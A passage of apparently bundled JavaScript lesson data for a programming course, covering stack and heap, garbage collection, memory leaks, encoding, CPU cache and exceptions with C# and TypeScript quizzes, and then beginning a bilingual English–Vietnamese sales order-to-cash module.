    decimal rate = 0.1m;
    return o.Total * rate;
}

void Checkout()
{
    int count = 3;
    var order = new Order { Total = 50 };
    var tax = Tax(order);
}`}},{type:"diagram",text:`STACK (one per thread)     HEAP
┌──────────────────┐
│ Tax         (top)│
│  o  ─────────────┼──┐
│  rate = 0.1      │  │   ┌────────────┐
├──────────────────┤  ├──►│ Order      │
│ Checkout         │  │   │ Total = 50 │
│  count = 3       │  │   └────────────┘
│  order ──────────┼──┘
└──────────────────┘`},{type:"text",text:"Each method call pushes a **frame** on top of the stack. The frame holds parameters and local variables. When the method returns, its frame is removed. That is instant."},{type:"text",text:"`new Order()` puts the object on the heap. The local `order` only holds a **reference**: an address that points to the object. Two variables can point to the same object. In C#, a `struct` (like `int` or `DateTime`) is copied instead. JavaScript objects and arrays also work by reference."},{type:"compare",left:{title:"Stack",items:["Small (often 1 MB to 8 MB per thread)","Very fast: push and pop","Freed when the method returns","Holds frames, locals, references"]},right:{title:"Heap",items:["Large (can be many GB)","Slower: must find free space","Freed later by the garbage collector","Holds objects, arrays, strings"]}},{type:"text",text:"**Stack overflow**: every call adds a frame. Recursion that goes too deep fills the stack. In .NET the process crashes, and `catch` cannot stop it. In JavaScript you get `RangeError: Maximum call stack size exceeded`."},{type:"example",title:"Same object, two names",text:'A clinic app passes a `Patient` to a method that "only formats the name". Inside, it sets `p.Name = p.Name.ToUpper()`. Now every screen shows the name in capitals. Both variables pointed to one object on the heap.'}],remember:"Stack = calls and locals, freed on return. Heap = objects, freed by the GC. A variable holds a reference, not the object.",questions:[{id:"runtime.stack-heap.1",kind:"code",difficulty:"easy",prompt:"What does this C# code print?",code:{lang:"csharp",text:`class Box { public int Value; }

var a = new Box { Value = 1 };
var b = a;
b.Value = 2;
Console.WriteLine(a.Value);`},choices:["1","2","0","It does not compile"],answer:1,why:"`b = a` copies the reference, not the object. Both variables point to the same `Box` on the heap. So the change through `b` is visible through `a`."},{id:"runtime.stack-heap.2",kind:"code",difficulty:"medium",prompt:"Now `Point` is a `struct`. What does this print?",code:{lang:"csharp",text:`struct Point { public int X; }

var p = new Point { X = 1 };
var q = p;
q.X = 2;
Console.WriteLine(p.X);`},choices:["2","0","1","It throws at runtime"],answer:2,why:"A `struct` is a value type. `q = p` copies the whole value. Changing `q` does not touch `p`.",remember:"class = shared reference. struct = copied value."},{id:"runtime.stack-heap.3",kind:"debug",difficulty:"medium",prompt:"A TypeScript function walks nested comment replies with recursion. With 50,000 nested replies it fails with `RangeError: Maximum call stack size exceeded`. Why?",choices:["Each nested call adds a frame, and the stack ran out of space","The heap is full, because 50,000 comments use too much memory","The result array grew past the maximum array length in JS","The garbage collector removed comments that were still in use"],answer:0,why:"50,000 comments is small for the heap. But each nested call adds a stack frame, and the stack is small. Use a loop with an array as your own stack."},{id:"runtime.stack-heap.4",kind:"truefalse",difficulty:"easy",prompt:"When a method returns, its stack frame is freed right away, without waiting for the garbage collector.",choices:["True","False"],answer:0,why:"The frame is simply popped off the stack. Heap objects that its locals pointed to stay until the GC finds them unreachable."}]},{id:"runtime.gc",title:"Garbage collection",summary:"How the GC decides what to free, and what it never cleans up for you.",minutes:5,blocks:[{type:"text",text:`The **garbage collector** (GC) frees heap memory you no longer use. You never free memory by hand. C#, Java and JavaScript all work this way.
How does it know what is unused? It starts from **roots** and follows every reference. Roots are what the program can use right now: locals on the stack and static fields.`},{type:"diagram",text:`ROOTS              HEAP
stack local ──► [Cart] ──► [Item]
static field ─► [Config]

               [Old cart] ──► [Item]
                   ▲
        nothing points here

Reachable  : Cart, Item, Config → kept
Unreachable: Old cart, its Item → freed`},{type:"diagram",text:`new object
    ▼
 Gen 0   checked very often, cheap
    │ still alive
    ▼
 Gen 1   checked less often
    │ still alive
    ▼
 Gen 2   checked rarely, big and slow`},{type:"text",text:`**Generations.** Most objects die young: a string built for one request is garbage a moment later. So the .NET GC checks new objects often and old objects rarely. V8 (Node and Chrome) also has a young and an old area.
**GC pauses.** Some GC work stops your threads for a short time. More allocation means more GC work. Many temporary objects in a **hot path** (code that runs very often) add up.`},{type:"code",code:{lang:"csharp",text:`// Hot path: called for every price check
bool IsVip(string name)
{
    // new list on every call → garbage
    var vips = new List<string> { "an", "binh" };
    return vips.Contains(name);
}

// Better: build it once, reuse it
static readonly HashSet<string> Vips =
    new() { "an", "binh" };
bool IsVip2(string name) => Vips.Contains(name);`}},{type:"text",text:"**The GC only manages memory.** Files, sockets and database connections are also resources. The GC does not close them on time. Close them yourself: `using` in C#, `try/finally` in TypeScript."},{type:"code",code:{lang:"csharp",text:`using var conn = new SqlConnection(cs);
await conn.OpenAsync();
// ... run queries ...
// Dispose() runs at the end of the scope,
// even after an exception.
// The connection goes back to the pool.`}},{type:"example",title:"The pool that ran dry",text:'A shop API opened a `SqlConnection` but forgot `using`. Memory looked fine. After an hour of traffic, requests failed with "max pool size was reached". The connections were never given back to the pool.'}],remember:"The GC frees objects that nothing can reach. It does not close files or connections: use `using` or `finally`.",questions:[{id:"runtime.gc.1",kind:"mcq",difficulty:"easy",prompt:"When can the GC free an object?",choices:["When no root can reach it through any chain of references","As soon as the method that created it returns","When the object has not been used for 60 seconds","Only after you set every variable pointing to it to null"],answer:0,why:"The GC follows references from the roots. Anything it cannot reach is garbage. An object created in a method can live on if something still points to it."},{id:"runtime.gc.2",kind:"debug",difficulty:"hard",prompt:'Under load, an API fails with "max pool size was reached". CPU and memory are fine. You find this code. What is wrong?',code:{lang:"csharp",text:`async Task<int> CountOrders()
{
    var conn = new SqlConnection(_cs);
    await conn.OpenAsync();
    var cmd = new SqlCommand(
        "SELECT COUNT(*) FROM Orders", conn);
    return (int)await cmd.ExecuteScalarAsync();
}`},choices:["The connection is never disposed, so it never goes back to the pool","COUNT(*) locks the whole Orders table while it runs","OpenAsync must be replaced with Open inside an API","The GC frees the connection too early, before the query ends"],answer:0,why:"The GC only cares about memory, so it does not close the connection on time. Under load the pool runs out first. Add `using var conn = ...` (and `using` for the command).",remember:"Connections, files, streams → `using`."},{id:"runtime.gc.3",kind:"perf",difficulty:"medium",prompt:"A method runs 500,000 times per second. A profiler shows a lot of time in GC, mostly Gen 0. What is the best first step?",choices:["Call `GC.Collect()` after each call to free memory sooner","Find and remove the temporary objects it creates per call","Add more RAM, so the GC has more room and runs less","Move the method to a new thread so GC pauses do not matter"],answer:1,why:"Many Gen 0 collections mean many short-lived objects. Create fewer of them in the hot path: build lists once, reuse buffers. `GC.Collect()` makes it worse, because it forces a full collection."},{id:"runtime.gc.4",kind:"truefalse",difficulty:"medium",prompt:"An object stored in a static list can be freed by the GC if your code never reads it again.",choices:["True","False"],answer:1,why:"The GC follows references, not your plans. A static field is a root, so everything in that list stays reachable."}]},{id:"runtime.leaks",title:"Memory leaks in managed languages",summary:"Events, timers and closures that keep old objects alive.",minutes:4,blocks:[{type:"text",text:"With a GC, a **leak** means you keep a reference you no longer need. The GC cannot free that object, because it is still reachable. Memory goes up and never comes back down."},{type:"diagram",text:`Long-lived                Short-lived
┌──────────────┐  event   ┌────────────┐
│ PriceService │ list ───►│ OrderPage  │
│ (singleton)  │          │ 20 MB data │
└──────────────┘          └────────────┘
 The page is closed, but the service
 still points to it → never freed`},{type:"code",code:{lang:"csharp",text:`public class OrderPage
{
    private readonly PriceService _prices;

    public OrderPage(PriceService prices)
    {
        _prices = prices;
        // the service now holds a ref to this page
        _prices.PriceChanged += OnPriceChanged;
    }

    // Fix: unsubscribe when the page closes
    public void Close() =>
        _prices.PriceChanged -= OnPriceChanged;

    void OnPriceChanged(object? s, EventArgs e)
    { /* refresh */ }
}`}},{type:"list",items:["**Event handlers** — a long-lived object keeps every subscriber alive until it unsubscribes.","**Timers** — `setInterval` keeps its callback, and everything the callback uses, until `clearInterval`.","**Closures** — a function that captures a big object keeps that object alive as long as the function lives.","**Global listeners** — `window.addEventListener` in a UI component, never removed when it closes.","**Caches and static lists** — they only grow unless you remove items or set a limit."]},{type:"code",code:{lang:"ts",text:`function startWidget(el: HTMLElement) {
  const rows = loadBigReport(); // 50 MB
  const id = setInterval(() => {
    el.textContent = String(rows.length);
  }, 1000);
  // The timer keeps "rows" and "el" alive.
  // Fix: give the caller a way to stop it.
  return () => clearInterval(id);
}`}},{type:"example",title:"The chat screens",text:"A support app opens a chat screen for each customer. Each screen subscribes to a global `MessageHub` event. Agents open 200 chats a day. Memory grows all day, because the hub still holds all the closed screens."},{type:"text",text:"How to spot one: memory grows with use and does not drop, even when the app is idle. Take a **heap snapshot** (a list of all objects in memory). Repeat one action 20 times, then take another. Compare them and look for object counts that keep growing. Tools: Chrome DevTools Memory tab, `dotnet-gcdump`."}],remember:"A leak in a GC language is a forgotten reference. Every subscribe needs an unsubscribe; every timer needs a stop.",questions:[{id:"runtime.leaks.1",kind:"debug",difficulty:"medium",prompt:"A web app gets slower after users open and close a dialog many times. A heap snapshot shows 300 `ReportDialog` objects, but only one is open. Most likely cause?",choices:["Something long-lived, like a listener, still points to closed dialogs","The browser turns off its GC for single-page apps by default","The dialogs live on the stack, and the stack is never cleared","The snapshot tool makes its own copies of the dialogs"],answer:0,why:"Closed dialogs should be unreachable. If 300 still exist, something reachable holds them. Usual suspects: a `window` listener, a timer or a global event bus that was never cleaned up."},{id:"runtime.leaks.2",kind:"code",difficulty:"hard",prompt:"`Clock` is a singleton. A new `Dashboard` is created each time a user opens it. What happens to old dashboards?",code:{lang:"csharp",text:`class Dashboard
{
    public Dashboard(Clock clock)
    {
        clock.Tick += (s, e) => Refresh();
    }

    void Refresh() { /* reload data */ }
}`},choices:["They stay in memory, because the clock event still refers to them","They are freed when the user closes the dashboard window","They are freed when the next Tick event runs","They cause a compile error, because lambdas cannot call methods"],answer:0,why:"The lambda calls `Refresh()`, so it captures `this`. The singleton clock holds the lambda, so every dashboard stays reachable. Keep the handler in a field and remove it when the dashboard closes."},{id:"runtime.leaks.3",kind:"truefalse",difficulty:"easy",prompt:"In a language with a garbage collector, memory leaks cannot happen.",choices:["True","False"],answer:1,why:"The GC frees only unreachable objects. If you keep a reference by mistake, the object stays forever. That is a leak."},{id:"runtime.leaks.4",kind:"scenario",difficulty:"hard",prompt:"You suspect a leak on the Orders page. What is the most reliable way to confirm it and find the cause?",choices:["Snapshot the heap, open and close the page 20 times, snapshot again","Watch the CPU graph, because a leak always shows as high CPU","Restart the server every night and see if users still complain","Call the GC by hand in the code and check if the page gets faster"],answer:0,why:"Repeating one action makes the leak big enough to see. Comparing two snapshots shows which objects keep growing and what holds them. Restarts only hide the problem.",remember:"Repeat the action, compare two snapshots."}]},{id:"runtime.bytes",title:"Bits, bytes and encoding",summary:"Binary, hex, UTF-8 and Base64 — how text and data become bytes.",minutes:5,blocks:[{type:"text",text:"Computers store everything as **bits**: 0 or 1. A **byte** is 8 bits. One byte can hold 256 different values, from 0 to 255."},{type:"diagram",text:`one byte = 8 bits
bit value: 128 64 32 16  8  4  2  1
bits:        0  1  0  0  0  0  0  1
           = 64 + 1 = 65 = "A" in ASCII

hex: 4 bits = 1 hex digit (0-9, A-F)
0100 0001  →  4 1  →  0x41 = 65
1111 1111  →  F F  →  0xFF = 255`},{type:"list",items:["**Hex** (base 16) is a short way to write bytes. Two hex digits = one byte. You see it in colors (`#FF8800`), GUIDs and memory dumps.","**KB, MB, GB** — about a thousand, a million, a billion bytes. Strictly, 1 **KiB** is 1,024 bytes. Many tools say KB but mean KiB.","**Mbps** is mega**bits** per second, not megabytes. 100 Mbps is about 12.5 MB per second."]},{type:"text",text:"Text is bytes too. An **encoding** is the rule that maps characters to bytes. **UTF-8** is the standard today. It uses 1 byte for English letters and 2 to 4 bytes for others."},{type:"diagram",text:`char      UTF-8 bytes (hex)   count
A         41                  1
é         C3 A9               2
ệ         E1 BB 87            3
(emoji)   F0 9F 98 80         4`},{type:"code",code:{lang:"ts",text:`const s = "Việt";
s.length;                           // 4
new TextEncoder().encode(s).length; // 6 bytes

// C#: Encoding.UTF8.GetByteCount("Việt") → 6`}},{type:"list",items:["**Base64** turns any bytes into plain text (A–Z, a–z, 0–9, +, /). The result is about 33% bigger. It is **encoding, not encryption**: anyone can decode it.","**Endianness** is the byte order of a number that needs several bytes. Most CPUs put the smallest byte first (little-endian). You meet it only in raw binary files and network packets."]},{type:"example",title:"Garbled names on a label",text:'A shipping label prints "Nguyá»…n" instead of "Nguyễn". The app wrote UTF-8 bytes. The label printer read them as Windows-1252, an old Western encoding. Same bytes, wrong rule.'}],remember:"Everything is bytes. Text needs an encoding (use UTF-8), and Base64 hides nothing.",questions:[{id:"runtime.bytes.1",kind:"mcq",difficulty:"easy",prompt:"How many different values can one byte hold?",choices:["8","255","256","1,024"],answer:2,why:"8 bits give 2⁸ = 256 combinations: the values 0 to 255. 255 is the largest value, not the count."},{id:"runtime.bytes.2",kind:"debug",difficulty:"medium",prompt:'An API limits the "name" field to 20 bytes in UTF-8. "Nguyễn Thị Ngọc Ánh" (19 characters) is rejected as too long. Why?',choices:["Letters with Vietnamese marks take 2 or 3 bytes each in UTF-8","The API counts each space twice when the text is in Vietnamese","UTF-8 always uses 2 bytes for every character in any language","The browser sends Vietnamese text as Base64, which is longer"],answer:0,why:'Plain letters are 1 byte in UTF-8, but "ễ", "ị" and "ọ" are 3 bytes and "Á" is 2. So the name is more than 20 bytes. Decide if a limit means characters or bytes.'},{id:"runtime.bytes.3",kind:"truefalse",difficulty:"easy",prompt:"A config file stores the database password as Base64. This keeps the password safe if the file leaks.",choices:["True","False"],answer:1,why:"Base64 is an encoding, not encryption. Anyone can decode it in one line. Keep secrets in a secret store, not in files.",remember:"Base64 is not security."},{id:"runtime.bytes.4",kind:"code",difficulty:"medium",prompt:"What do the two lines print?",code:{lang:"ts",text:`const s = "Hà Nội";
console.log(s.length);
console.log(new TextEncoder().encode(s).length);`},choices:["6 and 9","6 and 6","9 and 9","6 and 12"],answer:0,why:'`length` gives 6 here. In UTF-8, "à" needs 2 bytes and "ộ" needs 3, so the total is 9 bytes. Note: `length` counts UTF-16 units, so one emoji counts as 2.'},{id:"runtime.bytes.5",kind:"perf",difficulty:"medium",prompt:"You send a 3 MB image inside a JSON body as Base64. About how big is that field?",choices:["About 3 MB","About 4 MB","About 1 MB","About 6 MB"],answer:1,why:"Base64 turns every 3 bytes into 4 characters, so data grows by about one third. For big files, send the raw bytes instead, for example as a multipart upload."}]},{id:"runtime.cache",title:"CPU cache and locality",summary:"Why reading memory in order is fast, and jumping around is slow.",minutes:4,blocks:[{type:"text",text:"The CPU is very fast. Main memory (RAM) is slow compared to it. So the CPU keeps small, fast copies of recently used memory in its **cache**."},{type:"diagram",text:`Rough scale: if an L1 read took 1 second

register        under 1 s
L1 cache        1 s        (about 1 ns)
L2 cache        4 s
L3 cache        15 s
RAM             2 min      (about 100 ns)
SSD read        1 day      (about 100 µs)
network, same datacenter       6 days
network, other continent       5 years`},{type:"text",text:"The CPU loads memory in blocks called **cache lines**, usually 64 bytes. When you read one item, its neighbors come along for free. A **cache miss** means the data is not in the cache. Then the CPU waits for RAM, about 100 times longer."},{type:"diagram",text:`Array: values side by side
┌───┬───┬───┬───┬───┬───┬───┬───┐
│ 1 │ 2 │ 3 │ 4 │ 5 │ 6 │ 7 │ 8 │
└───┴───┴───┴───┴───┴───┴───┴───┘
 one load brings many neighbors

Linked list: nodes anywhere on the heap
 [1]───────────────►[2]
  ┌──────────────────┘
  ▼
 [3]──────►[4]   each step = a new load,
                 often a cache miss`},{type:"compare",left:{title:"Cache-friendly",items:["Arrays, `List<T>`, typed arrays","Reading from start to end, in order","Small structs packed together"]},right:{title:"Cache-unfriendly",items:["Linked lists, trees of small nodes","Random jumps through big data","Lists of objects spread over the heap"]}},{type:"code",code:{lang:"csharp",text:`int[,] grid = new int[4000, 4000];
long sum = 0;

// Fast: row by row, memory in order
for (int r = 0; r < 4000; r++)
    for (int c = 0; c < 4000; c++)
        sum += grid[r, c];

// Slow: column by column, 16 KB jump each step
for (int c = 0; c < 4000; c++)
    for (int r = 0; r < 4000; r++)
        sum += grid[r, c];`}},{type:"text",text:"Both loops do the same work, with the same Big-O. Yet the first one is often several times faster. Big-O counts steps, not cache misses."},{type:"example",title:"The warehouse picker",text:"Picking 20 items from one shelf, left to right, is quick. Picking 20 items spread across the whole warehouse takes far longer. The CPU is the picker. The cache is the shelf in front of it."}],remember:"Memory in order is fast; jumping around is slow. Arrays usually beat linked structures, even with the same Big-O.",questions:[{id:"runtime.cache.1",kind:"code",difficulty:"medium",prompt:"In C#, `int[,]` stores rows one after another. Which loop is usually faster?",code:{lang:"csharp",text:`var m = new int[5000, 5000];
long s = 0;
// A
for (int i = 0; i < 5000; i++)
    for (int j = 0; j < 5000; j++)
        s += m[i, j];
// B
for (int j = 0; j < 5000; j++)
    for (int i = 0; i < 5000; i++)
        s += m[i, j];`},choices:["A, because it reads memory in order","B, because columns are stored together","Same speed, because both do the same work","B, because the JIT swaps the loops"],answer:0,why:"A walks each row in memory order, so every cache line is fully used. B jumps 20 KB on each step, so most reads miss the cache. Same Big-O, very different speed."},{id:"runtime.cache.2",kind:"compare",difficulty:"medium",prompt:"You loop over 10 million numbers many times and sum them. Which structure is faster in practice?",choices:["An array or `List<int>`: values sit side by side","`LinkedList<int>`: each value in its own node"],answer:0,why:"Both are O(n) to loop. But the array reads memory in order, and one cache line holds 16 ints. Each linked node is a separate object, so many steps are cache misses."},{id:"runtime.cache.3",kind:"mcq",difficulty:"easy",prompt:"Which of these usually takes the longest?",choices:["Reading a value from the L1 cache","Reading a value from main RAM","Reading a block from an SSD","A call to a server on another continent"],answer:3,why:"A call across continents takes 100 ms or more. A RAM read takes about 100 ns, about a million times less. The network is the top of the latency ladder."},{id:"runtime.cache.4",kind:"perf",difficulty:"hard",prompt:"A job loops over 10,000 items. Inside the loop it reads the same setting from a remote config server. Each call takes 1 ms. What is the cost, and the fix?",choices:["About 10 s of waiting; read the setting once before the loop","About 10 ms; that is fine, since network calls are cheap","About 1 s; run the job on a server with a faster CPU","No cost; the CPU cache keeps the value after the first call"],answer:0,why:"10,000 × 1 ms = 10 seconds of waiting. The CPU cache cannot help, because the value lives on another machine. Read it once and keep it in a local variable.",remember:"Move slow reads out of loops."}]},{id:"runtime.exceptions",title:"Exceptions and their cost",summary:"What throw really does, why it is slow, and where finally fits.",minutes:4,blocks:[{type:"text",text:"When code **throws** an exception, normal flow stops. The runtime walks back up the call stack, frame by frame, looking for a matching `catch`. This is called **unwinding** the stack."},{type:"diagram",text:`Main()            catch here ◄─────┐
 └─ Checkout()    no catch: skip ──┤
     └─ Pay()     no catch: skip ──┤
         └─ Charge()   throw ──────┘

Each skipped frame runs its finally,
then it is removed from the stack.`},{type:"text",text:"Throwing is slow compared to a normal `return`. The runtime builds a stack trace and searches for a handler. Once in a while is fine. Thousands per second will hurt."},{type:"compare",left:{title:"Use exceptions for",items:["Real failures: database down, disk full","Broken rules a caller should never break","Problems this method cannot handle"]},right:{title:"Do not use them for",items:['Normal results like "not found"',"Checking user input","Jumping out of a loop"]}},{type:"code",code:{lang:"csharp",text:`// Slow: bad input is normal here
int ParseQty(string s)
{
    try { return int.Parse(s); }
    catch (FormatException) { return 0; }
}

// Better: no exception for expected cases
int ParseQty2(string s) =>
    int.TryParse(s, out var n) ? n : 0;`}},{type:"text",text:"`finally` runs after success, after `return` and after an exception. It is skipped only if the whole process dies. Put cleanup there: close files, hide spinners, release locks. A C# `using` is a short form of `try/finally`."},{type:"code",code:{lang:"ts",text:`async function loadReport(id: string) {
  showSpinner();
  try {
    return await fetchReport(id);
  } finally {
    hideSpinner(); // on success or error
  }
}`}},{type:"example",title:"The bank import",text:"A bank import reads 2 million lines. About 5% have a bad date. The first version wrapped `DateTime.Parse` in `try/catch`. That meant 100,000 exceptions per run. Switching to `TryParse` made the job much faster."}],remember:"Exceptions are for the unexpected. For normal outcomes, return a value. Put cleanup in `finally`.",questions:[{id:"runtime.exceptions.1",kind:"code",difficulty:"medium",prompt:"What does this print, in order?",code:{lang:"ts",text:`function f(): string {
  try {
    throw new Error("boom");
  } catch {
    return "catch";
  } finally {
    console.log("finally");
  }
}
console.log(f());`},choices:['"finally", then "catch"','"catch", then "finally"','Only "catch"','Only "finally"'],answer:0,why:'The return value "catch" is prepared, then `finally` runs and prints first. Only then does `f()` return, and the caller prints "catch".'},{id:"runtime.exceptions.2",kind:"perf",difficulty:"medium",prompt:"An API checks 50,000 rows per request with `try { decimal.Parse(x) } catch { ... }`. About 30% of rows are bad. CPU is high. What should you change first?",choices:["Use `decimal.TryParse` so bad rows do not throw","Add more servers to share the CPU load","Catch `Exception` instead of `FormatException`","Move the parsing into a separate async method"],answer:0,why:"30% of 50,000 is 15,000 exceptions per request. Each throw builds a stack trace and unwinds frames. `TryParse` reports bad input with a simple `false`."},{id:"runtime.exceptions.3",kind:"truefalse",difficulty:"easy",prompt:"A `finally` block runs even when its `try` block throws an exception that this method does not catch.",choices:["True","False"],answer:0,why:"While the stack unwinds, each frame runs its `finally` before it is removed. That is why cleanup belongs there."},{id:"runtime.exceptions.4",kind:"compare",difficulty:"medium",prompt:'A method looks up a customer by id. "Not found" happens often and is normal. Which design is better?',choices:["Return null, or a result object, when not found","Throw `CustomerNotFoundException` and let callers catch it"],answer:0,why:"An expected outcome is not an error. Returning a value is cheaper and shows the case in the method signature. Keep exceptions for real failures.",remember:"Expected outcome → return value. Real failure → exception."},{id:"runtime.exceptions.5",kind:"mcq",difficulty:"hard",prompt:"In the diagram, `Charge()` throws and the matching `catch` is in `Main()`. What happens to the frames below `Main()`?",choices:["They run their finally blocks and are removed","They stay, and the program continues at the throw line","Only the frame that threw is removed; the rest keep running","The whole stack is cleared, and Main starts again"],answer:0,why:"The runtime unwinds frame by frame up to the matching `catch`. Each frame runs its `finally` and is then removed. Code after the throw in those methods never runs."}]}],cheatSheet:[{title:"Running code",items:[{term:"Compiler",meaning:"Translates code before it runs"},{term:"Interpreter",meaning:"Runs code step by step while the program runs"},{term:"JIT",meaning:"Compiles to machine code at runtime, right before use"},{term:"IL",meaning:"CPU-neutral code inside a .NET .dll; the JIT turns it into machine code"},{term:"TypeScript types",meaning:"Checked at build time, gone at runtime"},{term:"Compile vs runtime error",meaning:"Build fails at your desk vs crash in front of a user"}]},{title:"Memory and GC",items:[{term:"Stack",meaning:"Call frames and locals; small, freed when a method returns"},{term:"Heap",meaning:"Objects and arrays; large, freed by the GC"},{term:"Reference",meaning:"An address that points to an object; copying it shares the object"},{term:"Stack overflow",meaning:"Recursion too deep; in .NET the process dies"},{term:"GC root",meaning:"Stack locals and static fields; anything they reach is kept"},{term:"Gen 0 / Gen 2",meaning:"New objects checked often; old objects checked rarely"},{term:"using / finally",meaning:"Close files and connections yourself; the GC will not do it on time"}]},{title:"Leaks",items:[{term:"Leak (with a GC)",meaning:"A reference you forgot to drop"},{term:"Event += without -=",meaning:"The publisher keeps every subscriber alive"},{term:"setInterval",meaning:"Keeps its callback and data alive until clearInterval"},{term:"Closure",meaning:"Keeps every variable it captures alive"},{term:"Heap snapshot",meaning:"List of objects in memory; compare two to find growth"}]},{title:"Bytes and text",items:[{term:"Byte",meaning:"8 bits, values 0 to 255"},{term:"Hex",meaning:"Base 16; two hex digits = one byte (0xFF = 255)"},{term:"UTF-8",meaning:"1 to 4 bytes per character; Vietnamese letters often 2 or 3"},{term:"Base64",meaning:"Bytes as text, about 33% bigger; not encryption"},{term:"Mbps vs MB/s",meaning:"Bits vs bytes: 100 Mbps ≈ 12.5 MB/s"},{term:"Endianness",meaning:"Byte order of multi-byte numbers; most CPUs are little-endian"}]},{title:"Speed",items:[{term:"Cache line",meaning:"Block the CPU loads at once, usually 64 bytes"},{term:"Cache miss",meaning:"Data not in cache; wait for RAM, about 100× slower"},{term:"Locality",meaning:"Read memory in order; arrays beat linked nodes"},{term:"Latency ladder",meaning:"Cache ≪ RAM ≪ SSD ≪ network"},{term:"Exception cost",meaning:"Stack trace + unwinding; never for normal control flow"},{term:"TryParse",meaning:"Handle expected bad input without throwing"}]}]},he=Object.freeze(Object.defineProperty({__proto__:null,default:re},Symbol.toStringTag,{value:"Module"})),ce={id:"sales",group:"domain",title:"Sales & Retail",emoji:"🛒",tagline:`From quote to cash, in shops and online.
VI: Từ báo giá đến thu tiền, tại cửa hàng và trên mạng.`,lessons:[{id:"sales.order-to-cash",title:"Order to cash · Từ đơn hàng đến thu tiền",summary:`The five steps of a sale, and their statuses.
VI: Năm bước của một lần bán hàng và các trạng thái của chúng.`,minutes:4,blocks:[{type:"text",text:`**Order to cash** is the full sales journey. It starts with a price offer. It ends when the money arrives.
VI: **Order to cash** là toàn bộ hành trình bán hàng. Nó bắt đầu từ báo giá và kết thúc khi tiền về tài khoản.`},{type:"diagram",text:`┌──────────────┐
│ Quote        │ báo giá
└──────┬───────┘ (sales staff)
       ▼
┌──────────────┐
│ Sales order  │ đơn bán hàng
└──────┬───────┘ (customer agrees)
       ▼
┌──────────────┐
│ Delivery     │ phiếu xuất kho
└──────┬───────┘ (stock goes out)
       ▼
┌──────────────┐
│ Invoice      │ hóa đơn
└──────┬───────┘ (customer now owes)
       ▼
┌──────────────┐
│ Payment      │ thu tiền
└──────────────┘ (debt goes down)`},{type:"text",text:`Each step creates a **document**. Each document points back to the one before it. So you can trace a payment back to the quote.
VI: Mỗi bước tạo ra một **chứng từ**. Mỗi chứng từ liên kết với chứng từ trước nó. Nhờ vậy có thể truy từ phiếu thu ngược về báo giá.`},{type:"diagram",text:`Order SO-101 (đơn bán hàng)
┌──────────┬─────────┬──────────┬──────┐
│ Item     │ Ordered │ Delivered│ Left │
├──────────┼─────────┼──────────┼──────┤
│ Milk box │ 100     │ 60       │ 40   │
└──────────┴─────────┴──────────┴──────┘
Delivery status: Partially delivered
Invoice 6,000,000  Paid 4,000,000
Payment status:  Partially paid
Still owed (công nợ): 2,000,000`},{type:"example",title:"A milk distributor",text:`A shop orders 100 boxes of milk. The warehouse has only 60. It ships 60 today and 40 next week. The invoice covers the 60 boxes. The shop pays part now and the rest at the end of the month.
VI: Một cửa hàng đặt 100 thùng sữa. Kho chỉ còn 60 thùng. Kho giao 60 thùng hôm nay, 40 thùng tuần sau. Hóa đơn tính cho 60 thùng. Cửa hàng trả một phần bây giờ, phần còn lại cuối tháng.`},{type:"code",code:{lang:"text",text:`SalesOrder(Id, CustomerId, OrderDate,
  DeliveryStatus, PaymentStatus)
SalesOrderLine(Id, OrderId, ItemId,
  QtyOrdered, QtyDelivered, QtyInvoiced,
  UnitPrice)
Delivery(Id, OrderId, Date, Status)
Invoice(Id, OrderId, Total, AmountPaid)
Payment(Id, CustomerId, Amount, PaidAt)
PaymentAllocation(PaymentId, InvoiceId,
  Amount)  -- 1 payment can pay many invoices`}},{type:"text",text:`Keep **delivery status** and **payment status** in separate fields. One field cannot say "half delivered and fully paid".
VI: Hãy tách **trạng thái giao hàng** và **trạng thái thanh toán** thành hai trường riêng. Một trường không thể thể hiện "giao một nửa nhưng đã trả đủ".`},{type:"list",items:[`Can we invoice before delivery, for example for a deposit?
VI: Có được xuất hóa đơn trước khi giao không, ví dụ khi đặt cọc?`,`Can one invoice cover many orders? Can one payment pay many invoices?
VI: Một hóa đơn có gộp nhiều đơn không? Một lần thu có trả cho nhiều hóa đơn không?`,`If the last 40 boxes never ship, who closes the order, and how?
VI: Nếu 40 thùng cuối không bao giờ giao, ai đóng đơn và đóng thế nào?`]}],remember:`Quote → order → delivery → invoice → payment. Track delivery and payment progress separately.
VI: Báo giá → đơn hàng → xuất kho → hóa đơn → thu tiền. Theo dõi tiến độ giao hàng và thu tiền riêng biệt.`,questions:[{id:"sales.order-to-cash.1",kind:"mcq",difficulty:"easy",prompt:`In which step does stock physically leave the warehouse?
VI: Ở bước nào hàng thực sự rời khỏi kho?`,choices:["Quote","Sales order","Delivery","Invoice"],answer:2,why:`The delivery (phiếu xuất kho) is the moment goods go out. The sales order only promises the goods.
VI: Phiếu xuất kho là lúc hàng ra khỏi kho. Đơn bán hàng chỉ là lời hứa giao hàng.`},{id:"sales.order-to-cash.2",kind:"scenario",difficulty:"medium",prompt:"An order has one `Status` column. 60 of 100 boxes are delivered. The invoice for those 60 is fully paid. What is the design problem?\nVI: Đơn hàng chỉ có một cột `Status`. Đã giao 60/100 thùng. Hóa đơn của 60 thùng đã trả đủ. Thiết kế này có vấn đề gì?",choices:["Set Status to Paid, since the only invoice is fully paid","One field cannot show delivery and payment progress at once","The system should split it into two orders automatically","Nothing; set Status to Completed and hide the other 40"],answer:1,why:`Delivery and payment move on their own. With one field, "Paid" hides that 40 boxes still wait. Use two status fields.
VI: Giao hàng và thanh toán tiến triển độc lập. Một trường "Paid" sẽ che mất 40 thùng còn chờ giao. Hãy dùng hai trường trạng thái.`},{id:"sales.order-to-cash.3",kind:"debug",difficulty:"hard",prompt:`A customer paid 4,000,000 of a 10,000,000 invoice. The receivables report shows they owe 0. What is the most likely bug?
VI: Khách trả 4.000.000 cho hóa đơn 10.000.000. Báo cáo công nợ lại hiện khách nợ 0. Lỗi nào khả năng cao nhất?`,choices:["The code marks the invoice Paid when any payment arrives","The report rounds every amount to the nearest million","The customer has no credit limit, so debt is not tracked","The payment was saved in a different currency by mistake"],answer:0,why:`Partial payment is normal. The invoice is paid only when the paid amount reaches the total. Compare amounts, do not set a flag on the first payment.
VI: Trả một phần là chuyện bình thường. Hóa đơn chỉ hết nợ khi số đã trả bằng tổng tiền. Phải so sánh số tiền, không đánh dấu "đã trả" ngay lần thu đầu.`},{id:"sales.order-to-cash.4",kind:"truefalse",difficulty:"medium",prompt:`One bank transfer can pay three invoices. So the system needs a link table between payments and invoices.
